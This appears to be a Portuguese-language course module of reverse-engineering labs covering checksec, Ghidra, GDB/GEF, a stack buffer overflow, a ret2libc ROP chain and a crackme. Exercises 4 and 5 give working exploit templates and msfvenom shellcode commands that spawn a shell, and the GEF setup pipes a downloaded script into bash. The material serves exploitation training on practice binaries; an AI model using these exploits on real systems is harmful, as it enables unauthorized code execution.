# 🔬 Módulo 6 — Labs de Engenharia Reversa

> Laboratórios práticos de análise estática, descompilação, debug e exploração de binários.

---

## Pré-requisitos

| Item | Mínimo | Recomendado |
|------|--------|-------------|
| Sistema | Linux (Kali/Parrot) | Kali 2024+ |
| RAM | 4 GB | 8 GB |
| Disco | 20 GB livre | 50 GB |
| Ferramentas | Ghidra, gdb, checksec | + GEF, ropper, pwntools |
| Conhecimento | Módulos 1-5 concluídos | Assembly básico |
| Network | Acesso a máquinas THM | Labs locais |

---

## Exercício 1: Análise Estática com checksec e file

⏱ **Tempo estimado:** 20 min

### 🎯 Objetivo
Identificar o tipo de binário e suas proteções de segurança antes de iniciar a engenharia reversa.

### 📚 Conhecimentos Necessários
- Formatos de binário (ELF, PE)
- Proteções: NX, PIE, ASLR, Stack Canary, RELRO
- Análise de strings e metadados
- Diferença entre binário 32-bit e 64-bit

### 🛠 Ferramentas
- `checksec` — verifica proteções do binário
- `file` — identifica tipo do binário
- `strings` — extrai strings legíveis
- `readelf` — analisa ELF headers

### 📋 Passo a Passo

1. **Identifique o tipo do binário:**
```bash
file ./binario
```
Saída esperada: `ELF 64-bit LSB executable, x86-64, ...`

2. **Verifique as proteções com checksec:**
```bash
checksec --file=./binario
```

3. **Analise cada proteção:**
| Proteção | Status Significado |
|----------|-------------------|
| NX (No-eXecute) | Stack não executável → precisa de ROP |
| PIE (Position Independent Executable) | Endereços aleatórios → ASLR |
| Stack Canary | Proteção contra buffer overflow |
| RELRO | Proteção contra GOT overwrite |
| ASLR | Endereços aleatórios no runtime |

4. **Extraia strings interessantes:**
```bash
strings ./binario | grep -i "flag\|password\|correct\|wrong"
```

5. **Leia headers ELF:**
```bash
readelf -h ./binario
readelf -S ./binario  # seções
```

### 💡 Macetes
- **Fluxo de análise estática:**
  1. `file` → saber arquitetura e bits
  2. `checksec` → saber proteções (define estratégia)
  3. `strings` → buscar chaves, senhas, flags
  4. `readelf` → entender estrutura do binário
- **Sempre comece pela análise estática** — antes de rodar qualquer coisa
- Se NX desabilitado → shellcode no stack funciona
- Se NX habilitado → precisa de ROP/ret2libc
- Se PIE habilitado → endereços mudam a cada execução
- Se Canary habilitado → buffer overflow direto não funciona

### ✅ Checklist
- [ ] Identifiquei tipo do binário (file)
- [ ] Verifiquei todas as proteções (checksec)
- [ ] Extraí strings relevantes
- [ ] Determinei se é 32-bit ou 64-bit
- [ ] Defini estratégia baseada nas proteções
- [ ] Anotei arquitetura e sistema operacional alvo

### 📎 Links
- [TryHackMe — Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
- [Checksec GitHub](https://github.com/slimm609/checksec.sh)
- [ELF Format](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)

---

## Exercício 2: Descompilação com Ghidra

⏱ **Tempo estimado:** 40 min

### 🎯 Objetivo
Descompilar um binário usando Ghidra e entender a lógica do programa para identificar vulnerabilidades.

### 📚 Conhecimentos Necessários
- Conceito de descompilação e decompilador
- Pseudocode C gerado pelo Ghidra
- Identificação de funções principais
- Variáveis, parâmetros e fluxo de execução

### 🛠 Ferramentas
- `Ghidra` — suíte de engenharia reversa (NSA)
- `nano` / `vim` — para anotações

### 📋 Passo a Passo

1. **Abra o Ghidra:**
```bash
ghidraRun
```

2. **Crie um novo projeto** e importe o binário:
   - File → Import File → selecione o binário
   - Confirme arquitetura (Auto-detect funciona bem)

3. **Aguarde a análise automática** (analyst).

4. **Navegue até a função `main`:**
   - Symbols tree → Functions → main
   - O painel de pseudocode mostra o código C

5. **Procure funções importantes:**
   - `main` — fluxo principal
   - `check` / `verify` / `login` — verificação de senha
   - `flag` / `win` / `success` — mensagem de sucesso
   - `gets` / `scanf` / `strcpy` — possíveis vulnerabilidades

6. **Analise o pseudocode:**
   - Identifique variáveis e suas finalidades
   - Entenda as comparações (if/else)
   - Mapeie o fluxo de dados

### 💡 Macetes
- **Funções a procurar primeiro:**
  - `main` — onde tudo começa
  - Qualquer função com "check", "verify", "auth", "password"
  - Funções com `gets()`, `strcpy()`, `sprintf()` → vulneráveis
  - Funções que imprimem "flag" ou "win"
- **Variáveis suspeitas:**
  - Variáveis declaradas com tamanho fixo (char buf[64])
  - Variáveis comparadas com valores constantes
- **Dica Ghidra:** clique em uma variável → pressione `L` para renomear
- **Anote os endereços** das funções importantes para usar no GDB

### ✅ Checklist
- [ ] Abri o binário no Ghidra corretamente
- [ ] Localizei a função main
- [ ] Identifiquei a lógica de verificação (check)
- [ ] Mapeei variáveis e suas finalidades
- [ ] Identifiquei possíveis vulnerabilidades (gets, strcpy)
- [ ] Anotei endereços das funções importantes

### 📎 Links
- [TryHackMe — Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
- [Ghidra Quick Start](https://ghidra-sre.org/QuickStartGuide.html)
- [Ghidra Cheat Sheet](https://github.com/Comsecuris/ghidra-scripts/blob/master/GhidraCheatSheet.md)

---

## Exercício 3: Debug com GDB/GEF

⏱ **Tempo estimado:** 45 min

### 🎯 Objetivo
Executar um binário passo a passo no debugger e examinar registradores, memória e stack.

### 📚 Conhecimentos Necessários
- Registradores x86/x64 (RAX, RBX, RCX, RDX, RSP, RIP)
- Stack e como dados são armazenados
- Breakpoints e execução passo a passo
- Inspeção de memória (x command)

### 🛠 Ferramentas
- `gdb` — GNU Debugger
- `GEF` — GDB Enhanced Features (melhor UI)

### 📋 Passo a Passo

1. **Abra o binário no GDB:**
```bash
gdb ./binario
```

2. **Instale GEF (se não tiver):**
```bash
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

3. **Defina breakpoint em main:**
```gdb
break main
run
```

4. **Examine registradores:**
```gdb
info registers
```

5. **Avance uma instrução:**
```gdb
stepi    # step into (entra em chamadas)
nexti    # step over (pula chamadas)
```

6. **Examine a stack:**
```gdb
x/20x $rsp    # 20 words em hex do topo da stack
x/s $rsp      # como string
```

7. **Examine memória:**
```gdb
x/10x 0x401000  # 10 words no endereço 0x401000
x/s 0x401000    # como string
```

8. **Continue execução:**
```gdb
continue
```

### 💡 Macetes
- **Comandos essenciais GDB:**
  | Comando | Função |
  |---------|--------|
  | `break *0x401150` | breakpoint em endereço |
  | `run` | inicia execução |
  | `stepi` | executa 1 instrução (entra em funções) |
  | `nexti` | executa 1 instrução (pula funções) |
  | `info registers` | mostra todos os registradores |
  | `x/Nx ADDR` | examina N words em ADDR |
  | `x/s ADDR` | examina como string |
  | `set $rax = 1` | modifica registrador |
  | `continue` | continua até próximo breakpoint |
- **GEF provides:** visual stack, registers, code view — muito melhor que GDB puro
- **Use `disassemble main`** para ver assembly da função
- **Anote endereços** de cada etapa para montar seu exploit

### ✅ Checklist
- [ ] Abri o binário no GDB com GEF
- [ ] Defini breakpoint em main e executei
- [ ] Examinei todos os registradores
- [ ] Acompanhei execução com stepi/nexti
- [ ] Examinei a stack em diferentes momentos
- [ ] Entendi como os dados são passados para funções
- [ ] Identifiquei endereços-chave para exploração

### 📎 Links
- [TryHackMe — Gateway Intercept](https://tryhackme.com/room/gatewayintercept)
- [GDB Documentation](https://www.gnu.org/software/gdb/documentation/)
- [GEF GitHub](https://github.com/hugsy/gef)
- [GDB Cheat Sheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)

---

## Exercício 4: Buffer Overflow Básico

⏱ **Tempo estimado:** 60 min

### 🎯 Objetivo
Sobrescrever o return address de uma função para obter shell ejecutando código arbitrário.

### 📚 Conhecimentos Necessários
- Stack buffer overflow
- Offset até EIP/RIP
- Shellcode e NOP sled
- pattern_create e pattern_offset

### 🛠 Ferramentas
- `gdb` + `GEF` — debugger
- `pattern_create.rb` — gera pattern único
- `pattern_offset.rb` — encontra offset
- `msfvenom` — gera shellcode

### 📋 Passo a Passo

1. **Identifique o buffer overflow:**
   - No Ghidra/GDB, veja onde `gets()` ou `strcpy()` recebe input
   - Identifique o tamanho do buffer

2. **Encontre o offset com pattern:**
```bash
# Gerar pattern de 200 bytes
pattern_create.rb -l 200
```

3. **Use o pattern no programa:**
```bash
# No GDB
run [pattern_copiado]
```

4. **Quando EIP/RIP for sobrescrito, encontre o offset:**
```gdb
# GDB puro
pattern offset $eip

# GEF
pattern offset $rip
```
Resultado: `Desired value: 0x41366241 found at offset: 140`

5. **Gere o shellcode:**
```bash
# Linux x64
msfvenom -p linux/x64/exec CMD=/bin/sh -f python -b '\x00\x0a\x0d'

# Linux x86
msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0a\x0d'
```

6. **Monte o exploit:**
```python
import struct

offset = 140
nop_sled = b'\x90' * 16
shellcode = b'\x48\x31\xff\x6a\x69\x58\x0f\x05...'  # msfvenom output
padding = b'A' * (offset - len(nop_sled) - len(shellcode))

# Encontre o endereço do NOP sled (via GDB)
ret_addr = struct.pack('<Q', 0x7fffffffe4a0)

payload = padding + nop_sled + shellcode + ret_addr
```

7. **Envie o payload:**
```bash
python3 exploit.py | ./binario
```

### 💡 Macetes
- **Offset é a distância** entre início do buffer e EIP/RIP
- **NOP sled** (`\x90`) = zona de segurança se endereço não for exato
- **Shellcode do msfvenom** gera código compacto e eficiente
- **Para testar:** primeiro substitua ret_addr por "BBBB" (0x42424242) e veja se EIP = 0x42424242
- **Se o programa não aceita input:**
```bash
python3 exploit.py > payload.txt
cat payload.txt | ./binario
# ou
./binario < payload.txt
# ou
(echo "AAAA..."; cat) | ./binario
```
- **Shellcode bytes não podem conter:** `\x00` (null), `\x0a` (newline), `\x0d` (carriage return)

### ✅ Checklist
- [ ] Identifiquei o buffer overflow no código
- [ ] Encontrei o offset correto com pattern
- [ ] Confirmei sobrescrita de EIP/RIP com "BBBB"
- [ ] Gerei shellcode funcional com msfvenom
- [ ] Encontrei endereço do NOP sled
- [ ] Montei o exploit completo
- [ ] Obtive shell execução

### 📎 Links
- [TryHackMe — Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
- [msfvenom Payloads](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [Buffer Overflow Guide — Corelan](https://www.corelan.be/index.php/2009/07/19/exploiting-stack-based-buffer-overflows-part-1/)

---

## Exercício 5: ROP Chain

⏱ **Tempo estimado:** 75 min

### 🎯 Objetivo
Criar uma ROP (Return-Oriented Programming) chain para bypass de proteção NX em binários.

### 📚 Conhecimentos Necessários
- ROP e por que é necessário (NX habilitado)
- Gadgets e como encontrá-los
- ret2libc (usar funções da libc)
- PLT/GOT e chamadas de funções

### 🛠 Ferramentas
- `ropper` — busca de gadgets
- `ROPgadget` — busca de gadgets
- `pwntools` — framework de exploits Python

### 📋 Passo a Passo

1. **Confirme que NX está habilitado:**
```bash
checksec --file=./binario
# NX enabled → não pode executar shellcode no stack
```

2. **Encontre gadgets com ROPgadget:**
```bash
ROPgadget --binary ./binario
```

3. **Encontre gadgets específicos com Ropper:**
```bash
ropper --file ./binario --search "pop rdi"
ropper --file ./binario --search "pop rsi"
ropper --file ./binario --search "ret"
```

4. **Para ret2libc, encontre endereços da libc:**
```bash
# No GDB
info proc map
# Anote: libc base, system, /bin/sh
```

5. **Monte a ROP chain:**
```python
from pwn import *

# Endereços (encontrados no GDB/ROPgadget)
pop_rdi = 0x401234      # pop rdi; ret
ret = 0x40101a          # ret (stack alignment)
system = 0x7ffff7e32390 # system() da libc
bin_sh = 0x7ffff7f53a0a # "/bin/sh" da libc

offset = 140

payload = b'A' * offset
payload += struct.pack('<Q', pop_rdi)
payload += struct.pack('<Q', bin_sh)
payload += struct.pack('<Q', ret)  # alignment
payload += struct.pack('<Q', system)
```

6. **Envie o payload:**
```bash
python3 exploit_rop.py | ./binario
```

### 💡 Macetes
- **ROP Chain = encadear gadgets** que terminam em `ret`
- **ret2libc** é o ROP mais comum: `pop rdi; ret` → argumento → `system()`
- **Stack alignment:** em x64, pode ser necessário gadget `ret` extra
- **pwntools** simplifica tudo:
```python
from pwn import *
p = process('./binario')
# p32() para 32-bit, p64() para 64-bit
payload = b'A' * offset + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendline(payload)
p.interactive()
```
- **Gadgets úteis:**
  - `pop rdi; ret` — carrega argumento em RDI
  - `pop rsi; ret` — carrega argumento em RSI
  - `ret` — alinhamento de stack
  - `pop rax; ret` — define syscall number

### ✅ Checklist
- [ ] Confirmei NX habilitado
- [ ] Encontrei gadgets necessários (pop rdi, ret)
- [ ] Identifiquei endereços da libc (system, /bin/sh)
- [ ] Montei a ROP chain corretamente
- [ ] Considerei stack alignment (gadget ret extra)
- [ ] Testei o exploit passo a passo
- [ ] Obtive shell via ROP chain

### 📎 Links
- [TryHackMe — Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)
- [ROPgadget GitHub](https.com/JonathanSalwan/ROPgadget)
- [Ropper GitHub](https://github.com/sashs/Ropper)
- [ROP Emporium](https://ropemporium.com/)
- [ret2libc Tutorial](https://www.corelan.be/index.php/2011/07/14/exploiting-stack-based-buffer-overflows-part-5/)

---

## Exercício 6: Crackme Challenge (Desafio Final)

⏱ **Tempo estimado:** 60 min

### 🎯 Objetivo
Resolver um crackme completo: encontrar a senha/chave correta aplicando todas as técnicas de engenharia reversa estudadas.

### 📚 Conhecimentos Necessários
- Todas as técnicas dos exercícios 1-5
- Análise estática e dinâmica combinadas
- Lógica de comparação e branches
- Decomposição de algoritmos simples

### 🛠 Ferramentas
- `Ghidra` — descompilação
- `gdb` + `GEF` — debug
- `pwntools` — scripting de exploits
- `strings` — extração de strings

### 📋 Passo a Passo

1. **Análise estática inicial:**
```bash
file ./crackme
checksec --file=./crackme
strings ./crackme | head -30
```

2. **Abra no Ghidra** e analise o pseudocode:
   - Procure a função `main`
   - Identifique a lógica de verificação
   - Encontre a comparação da senha

3. **Identifique o tipo de verificação:**
   - Comparação direta: `if (input == "senha")`
   - Comparação caractere por caractere: `if (input[0] == 'a' && input[1] == 'b'...)`
   - XOR/cálculo matemático: `if (input ^ 0x42 == expected)`

4. **Debug no GDB para confirmar:**
```bash
break *0x401180  # endereço da comparação
run
# examine registradores e memória
```

5. **Resolva a senha:**
   - Se comparação direta → extraia a string do binário
   - Se caractere a caractere → extraia cada byte
   - Se XOR/cálculo → resolva a equação

6. **Teste sua senha:**
```bash
echo "senha_correta" | ./crackme
# ou
./crackme <<< "senha_correta"
```

### 💡 Macetes
- **Tipos comuns de verificação em crackmes:**
  - **String direta:** `strcmp(input, "flag{...}")` → strings no binário
  - **XOR:** cada caractere é XOR com chave → analise no Ghidra
  - **Checksum:** soma/Hash dos caracteres → resolva a equação
  - **CRC/MD5:** compara hash → quebre o hash
- **Estratégia geral:**
  1. Strings → procure padrões no output
  2. Ghidra → entenda a lógica de comparação
  3. GDB → confirme cada passo dinamicamente
  4. Script → automate a resolução
- **Se encontrar chamadas de system():**
  - Pode ser bypass com NOP
  - Ou ROP chain para pular a verificação
- **Anote os endereços** de cada comparação para debug preciso

### ✅ Checklist
- [ ] Fiz análise estática completa (file, checksec, strings)
- [ ] Abri no Ghidra e identifiquei a lógica
- [ ] Debug no GDB para confirmar comportamento
- [ ] Identifiquei o tipo de verificação
- [ ] Resolvi a senha/chave correta
- [ ] Testei e confirmei que a senha funciona
- [ ] Documentei cada etapa do processo

### 📎 Links
- [TryHackMe — Gateway Intercept](https://tryhackme.com/room/gatewayintercept)
- [CrackMe Collection](https://crackmes.one/)
- [ROP Emporium](https://ropemporium.com/)
- [pwnable.kr](https://pwnable.kr/)
- [pwnable.tw](https://pwnable.tw/)

---

## 📊 Resumo dos Labs

| # | Exercício | Ferramentas | Tempo |
|---|-----------|-------------|-------|
| 1 | Análise Estática | checksec, file, strings | 20 min |
| 2 | Descompilação Ghidra | Ghidra | 40 min |
| 3 | Debug GDB/GEF | gdb, gef | 45 min |
| 4 | Buffer Overflow | gdb, msfvenom, pattern | 60 min |
| 5 | ROP Chain | ropper, ROPgadget, pwntools | 75 min |
| 6 | Crackme Challenge | Todas | 60 min |

---

> ⚠️ **AVISO LEGAL:** Estes labs são para fins educacionais. Pratique apenas em binários destinados para isso (crackmes, CTFs, máquinas THM). Engenharia reversa em software protegido sem autorização pode violar leis de direitos autorais.
